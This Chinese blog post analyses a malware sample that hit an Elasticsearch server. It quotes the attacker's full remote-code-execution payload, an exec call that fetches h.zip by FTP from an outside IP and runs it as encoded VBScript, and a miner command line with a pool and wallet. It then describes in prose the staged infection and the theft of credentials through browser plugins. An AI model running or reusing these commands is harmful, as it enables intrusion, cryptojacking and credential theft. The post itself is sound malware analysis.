---
layout: post
title: 一个简单的样本分析
description: "去年获取的某个样本分析"
category: analysis
tags: [analysis]
imagefeature: http://7xwdx7.com1.z0.glb.clouddn.com/5551e1cabd3bb.jpg
comments: true
share: true
---

### 背景

去年的某一天，在elastic search的某个QQ交流群中，有人贴出了一段日志，显示他的服务器被人进行了远程代码执行的攻击，日志内容如下：

{% highlight json %}

{
  "script": "java.lang.Math.class.forName("java.lang.Runtime").getRuntime().exec("cmd.exe /c echo open 58.215.19.139>f&echo 111>>f&echo qwe>>f&echo bin>>f&echo get h.zip>>f&echo bye>>f&ftp -s:f&cscript.exe /b /e:VBScript.Encode h.zip&del /f/q f&exit").getText()"
}

{% endhighlight %}

脚本大意是创建一个ftp脚本，从IP地址58.215.19.139下载一个名为h.zip的文件，并以vbscript的方式进行执行，执行完成后删除脚本。

### 展开初步分析

为了学习理解攻击方式，我下载了这个攻击载荷，并通过对vbscript的解码还原了该攻击载荷的攻击流程和攻击方式。

h.zip作为打头进行运行的恶意载荷负责进行系统信息探测和恶意程序加载工作。首先，它对以下相关系统信息进行探测：

* 获取注册表中操作系统语言
* 获取注册表中操作系统版本号
* 获取注册表中cpu核数
* 测试肉鸡是否能够翻墙
* 获取当前系统开机运行时间

在完成系统信息探测后，根据不同的操作系统版本、操作系统语言和操作系统用途，打头程序加载不同的恶意程序感染肉鸡的操作系统。

* 操作系统为XP，语言为简体或繁体中文且无法翻墙-->加载中文版本某mof文件
* 操作系统为XP，语言为简体或繁体中文且可以翻墙-->加载英文版本某mof文件
* 对于操作系统为XP，语言为简体或繁体中文的机器，进一步对其当前操作系统运行时间进行识别。若连续运行时间大于9小时，则使用dl.vbs进行下一步感染，dl.vbs感染的恶意程序主要用来连接比特币矿池进行挖矿；若连续运行时间小于9小时，则使用bdved.vbs进行下一步感染，bdved.vbs加载的恶意程序带有在用户进行网购时进行盗号的功能。
* 对于非XP版本或者其他语言版本的windows操作系统，加载英文版本某mof文件，并使用dl.vbs进行下一步感染。

### dl.vbs感染的恶意程序的主要功能

dl.vbs使用户下载一个dat文本文件和一个pe执行体，该dat文本文件中使用pe执行体执行如下命令：
`mstdc.exe -a m7 -o stratum+tcp://xcnpool.1gh.com:7333 -u CGX2U2oeocN3DTJhyPG2cPg7xpRRTzNZkz -p x --retries 5 --retry-pause=20`

该命令作用为开启一个名为MaxCoin 的矿池所使用的挖矿客户端，攻击者所使用的帐户为CGX2U2oeocN3DTJhyPG2cPg7xpRRTzNZkz。该矿池地址：http://max.1gh.com/

![MaxCoin](http://7xwdx7.com1.z0.glb.clouddn.com/MaxCoin.png)

### bdved.vbs感染的恶意程序的主要功能

bdved.vbs感染的恶意程序更为复杂，它含有两个压缩包、一个unrar.exe文件和一个bat文件。它的启动原理和攻击方式都更为隐蔽。攻击者通过命令：ping -n 5 127.0.0.1进行延时操作，不在下载完成的第一瞬间启动恶意程序。

恶意程序分为32位和64位两种版本，拥有不同的启动方式和可执行文件，具体的技术细节仍需要通过进一步分析进行还原。

值得注意的是该恶意软件的盗号方式比较新颖，使用的是浏览器插件+中间人攻击的方式。恶意软件启动后，一旦肉鸡操作系统安装了某些特定厂商的浏览器，恶意程序就试图在这些浏览器中安装用来进行中间人攻击的插件。

这些插件通过篡改浏览器端页面内的链接对http或https流量进行中间人攻击劫持，用户在登陆时提交的用户名、密码能够被攻击者截获并记录。具体原理如下：
* 恶意程序在肉鸡操作系统的360安全浏览器或百度浏览器安装恶意插件
* 浏览器恶意插件在用户访问以下域名时实施中间人攻击
* 恶意的浏览器插件将用户访问的页面地址及标题上传至控制端，控制端可以插入js脚本执行各种攻击动作。

攻击者关心的域名列表：

![域名列表](http://7xwdx7.com1.z0.glb.clouddn.com/domainList.png)

上传至控制端的链接地址：
![url1](http://7xwdx7.com1.z0.glb.clouddn.com/url1.png)
![url2](http://7xwdx7.com1.z0.glb.clouddn.com/url2.png)

完整攻击步骤可以整理为下图中所示：
![攻击步骤整理](http://7xwdx7.com1.z0.glb.clouddn.com/step.png)

### 一些思考
国内杀软通常会捆绑浏览器等大量系统软件，也就是所谓的“全家桶”。然而，这些附带的浏览器等系统软件居然被用来当作盗号的切入点。这些系统软件显然具有较高的优先级，杀毒软件没有对浏览器插件等进行严格的扫描和权限控制，这一点还是非常值得深入思考的。不得不说，有的时候最好的盾牌也是最锋利的长矛。
